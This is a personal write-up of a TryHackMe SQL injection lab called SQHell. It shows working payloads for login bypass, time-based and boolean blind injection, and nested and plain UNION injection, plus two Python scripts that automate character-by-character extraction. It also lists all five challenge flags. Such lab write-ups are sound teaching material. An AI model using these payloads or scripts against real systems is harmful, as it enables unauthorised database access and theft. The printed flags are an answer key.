# SQHell

**Platform:** TryHackMe
**Date:** 2026-09-18
**Difficulty:** Medium
**Category:** Web / SQL Injection
**Room URL:** [TryHackMe — SQHell](https://tryhackme.com/room/sqhell?utm_source=chatgpt.com)
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

SQHell is basically a collection of different **SQL Injection** vulnerabilities. Instead of using the same technique five times, the room makes me use different types of SQLi, including login bypass, time-based blind SQLi, boolean-based SQLi, nested UNION injection, and standard UNION injection.

This room was a good demonstration of how SQL Injection can go way beyond just bypassing a login page.

---

## 🔍 Reconnaissance

As usual, I started with recon to see what ports were open and what services were running.

### Nmap Scan

I first ran a full TCP scan:

```
nmap -sV -p- -T4 10.114.133.63
```

**Results:**

|Port|Service|Version|Notes|
|---|---|---|---|
|22|SSH|OpenSSH 8.2p1 Ubuntu|SSH|
|80|HTTP|nginx 1.18.0|Web application|

Since the room was literally called **SQHell**, I already knew SQL Injection was probably going to be the main attack surface.

So I went straight to the web application and started looking for places where user-controlled input was being sent to the backend.

---

## 🧭 Steps I Took

### Step 1 — Login SQL Injection

The homepage contained a blog and, more importantly, a login form.

Since authentication forms are one of the first places I test for SQLi, I tried a basic authentication-bypass payload:

```
admin' or 1=1;-- -
```

The injection worked and I was able to bypass the authentication.

- **What I found:**

```
Authentication bypassed
```

- **Flag:**

```
THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
```

- **Why it matters:**

This is the simplest form of SQL Injection. If the application directly puts the username into a SQL query without properly parameterizing it, I can alter the logic of the query instead of just supplying a username.

---

### Step 2 — Finding SQLi in `X-Forwarded-For`

The next clue came from the Terms and Conditions page.

It mentioned tracking client IP addresses using HTTP headers such as:

```
X-Forwarded-For
```

That immediately stood out to me.

Headers are still user-controlled input. Just because something isn't entered into a visible form doesn't mean the application can safely trust it.

I intercepted a request using Burp Suite and injected a time-based SQLi payload into the header:

```
X-Forwarded-For: 127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '1'='1
```

- **What I found:**

The server response was delayed by approximately **5 seconds**.

- **Why it matters:**

The delay confirmed that my input was reaching a SQL query and that I could control whether `SLEEP()` executed.

So I had found a **time-based blind SQL Injection** vulnerability.

---

### Step 3 — Extracting Flag 2 With Time-Based Blind SQLi

The problem with blind SQLi is that I don't get the database output directly.

Instead, I have to ask the database questions and use its response to determine whether the answer is true or false.

In this case, I could make the database sleep if a particular character of the flag matched my guess.

For example:

```
1' AND (SELECT sleep(5) FROM flag WHERE SUBSTR(flag,1,1) = 'T') AND '1'='1
```

If the first character was `T`, the database would sleep.

If it wasn't `T`, there would be no delay.

So instead of doing this manually for every character, I wrote a Python script to automate it.

```
import requests
import time
import string

url = "" # Room IP

characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'

flag = ""
counter = 1

while True:
    for i in characterlist:

        payload = f"1' AND (SELECT sleep(2) FROM flag WHERE SUBSTR(flag,{counter},1) = '{i}') AND '1'='1"

        headers = {
            'X-Forwarded-For': payload
        }

        start = time.time()

        r = requests.get(url, headers=headers)

        end = time.time()

        if end - start >= 2:
            flag += i
            counter += 1
            break

    print(flag)

    if len(flag) >= 43:
        exit(f"The Flag is: {flag}")
```

I ran it with:

```
python3 flag2_extract.py
```

The script basically did this:

1. Pick a position in the flag.
2. Try every possible character.
3. Put the character into a `SUBSTR()` condition.
4. Send the payload through `X-Forwarded-For`.
5. Measure the response time.
6. If the response takes around 2 seconds or more, the character is correct.
7. Add that character to the flag.
8. Move to the next position.

Eventually I got:

```
THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
```

- **Flag:**

```
THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
```

- **Why it matters:**

This showed me that SQL Injection doesn't need to directly return database results.

Even something as simple as **response time** can become a communication channel.

Also, the fact that `X-Forwarded-For` was trusted was a huge part of this vulnerability.

---

### Step 4 — Boolean-Based SQLi in the Username Check

Next, I looked at the registration page.

The page checked whether a username was already taken through a JavaScript request to:

```
/register/user-check
```

I accessed the endpoint directly and started testing the `username` parameter.

First, I used a false condition:

```
http://sqhell.thm/register/user-check?username=admin' and 1=2;-- -
```

The response said:

```
available: true
```

Then I changed the condition to something true:

```
http://sqhell.thm/register/user-check?username=admin' and 1=1;-- -
```

This time the response said:

```
available: false
```

This was exactly what I was looking for.

The endpoint was acting as a **boolean oracle**.

A false SQL condition resulted in:

```
available: true
```

while a true SQL condition resulted in:

```
available: false
```

- **Why it matters:**

The endpoint wasn't designed to reveal database information.

It was only supposed to tell the user whether a username was available.

But because the SQL query was injectable, that simple true/false response could be abused to extract information from the database.

---

### Step 5 — Extracting Flag 3

Now that I knew I had a boolean oracle, I tested whether I could use it to check individual characters of the flag.

I used:

```
http://sqhell.thm/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),1,1)) = 'T';-- -
```

The response returned:

```
false
```

That actually meant the condition was true — the character matched.

So I automated the entire process with Python.

```
import requests
import string

characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'

ip = "" # Change to machine IP

flag = ""
counter = 1

while True:

    for i in characterlist:

        r = requests.get(
            "http://" + ip +
            f"/register/user-check?username=admin' and "
            f"(substr((SELECT flag FROM flag LIMIT 0,1),{counter},1)) = '{i}';-- -"
        )

        if 'false' in r.text:
            flag += i
            counter += 1
            print(flag)
            break
```

The script tested every possible character at every position.

Whenever the server returned `false`, I knew the character was correct, so the script added it to the flag and moved to the next position.

Eventually, the complete flag was:

```
THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
```

- **Flag:**

```
THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
```

- **Why it matters:**

This was a good example of how **boolean-based blind SQLi** works.

I wasn't seeing the database result directly. I was basically asking the database:

> "Is this character `T`?"

Then:

> "Is it `H`?"

Then:

> "Is it `M`?"

And so on.

The application's response told me whether my guess was correct.

---

### Step 6 — Investigating the User Profile

The next vulnerable endpoint was the user profile:

```
http://sqhell.thm/user?id=1
```

The page displayed user information and their submitted posts.

I tested the `id` parameter with a UNION query:

```
http://sqhell.thm/user?id=1 union select null,null,null;-- -
```

The query worked.

This told me that the first SQL query used **3 columns**.

- **What I found:**

```
3 columns
```

I tried enumerating the database from this query, but I wasn't getting anywhere.

I also noticed that changing the user ID generally resulted in:

```
user not found
```

except for the existing user.

Then I changed the first `NULL` to a literal value:

```
1
```

and something interesting happened.

The page started displaying posts even when the original user ID shouldn't have existed.

That suggested something more complicated was happening behind the scenes.

The result from the first query was being used to construct another query.

So I wasn't dealing with just one SQL query.

There was another query underneath it.

---

### Step 7 — Nested UNION Injection

This is where the room's **Inception** hint finally made sense.

I needed to inject into the second query.

I started testing different column counts:

```
http://sqhell.thm/user?id=2 union select "1 union select null,null,null,null",null,null from information_schema.tables where table_schema=database();-- -
```

Eventually, I found that the nested query required **4 columns**.

Once I had the column count, I could start targeting the flag table.

I used:

```
http://sqhell.thm/user?id=2 union select "1 union select null,flag,null,null from flag",null,null from information_schema.tables where table_schema=database();-- -
```

The injected query successfully caused the flag to be rendered inside the posts section.

The result was:

```
THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}
```

- **Flag:**

```
THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}
```

- **Why it matters:**

This was probably the most interesting SQLi in the room.

The application was effectively taking the output from one query and using it to build another query.

So I had to understand the first query before I could reach the second one.

It was basically **SQL Injection inside another SQL Injection**.

---

### Step 8 — Testing the Post Parameter

The final vulnerable endpoint was the post page:

```
http://sqhell.thm/post?id=2
```

I tested the parameter by adding a quote:

```
http://sqhell.thm/post?id=2'
```

The application returned a SQL error.

That immediately confirmed that the parameter was injectable.

- **Why it matters:**

Sometimes you don't need a complicated payload to confirm SQLi.

A simple quote causing a database error can already tell me that my input is reaching the SQL query.

---

### Step 9 — Finding the UNION Column Count

For a UNION-based SQL injection to work, the number of columns in the injected query needs to match the number of columns returned by the original query.

I used `ORDER BY` to find the number of columns.

For example:

```
http://sqhell.thm/post?id=2 order by 5
```

This produced an error.

So I knew the query didn't have 5 columns.

After testing the values, I determined that the query used:

```
4 columns
```

- **What I found:**

```
ORDER BY 5 → Error
```

Therefore:

```
4 columns
```

---

### Step 10 — Extracting Flag 5

Now that I knew the column count, I could perform the UNION attack.

I used:

```
http://sqhell.thm/post?id=2 and 1=2 union select null,null,flag,null from flag
```

The:

```
and 1=2
```

part makes the original query return nothing.

That means the only data displayed should be the data from my UNION query.

The flag was then rendered on the page:

```
THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```

- **Flag:**

```
THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```

And that gave me all five flags.

---

## 🛠 Commands Used

|Command / Payload|What It Does|
|---|---|
|`nmap -sV -p- -T4 TARGET_IP`|Full TCP port scan with service/version detection|
|`gobuster dir`|Searches for hidden directories and files|
|`admin' or 1=1;-- -`|Basic SQL authentication bypass|
|`SLEEP(5)`|Creates a measurable delay for time-based blind SQLi|
|`SUBSTR()`|Extracts individual characters from a string|
|`ORDER BY`|Helps determine the number of SQL columns|
|`UNION SELECT`|Combines attacker-controlled query results with the original query|
|`information_schema`|Provides database metadata|
|`requests.get()`|Sends HTTP requests from Python|
|`time.time()`|Measures HTTP response time|

---

## 🚩 Flags Found

|Flag|Value|
|---|---|
|Flag 1|`THM{FLAG1:E786483E5A53075750F1FA792E823BD2}`|
|Flag 2|`THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}`|
|Flag 3|`THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}`|
|Flag 4|`THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}`|
|Flag 5|`THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}`|

---

## 📎 Resources Used

- TryHackMe — SQHell
- Burp Suite
- Python `requests`
- My own SQLi extraction scripts

---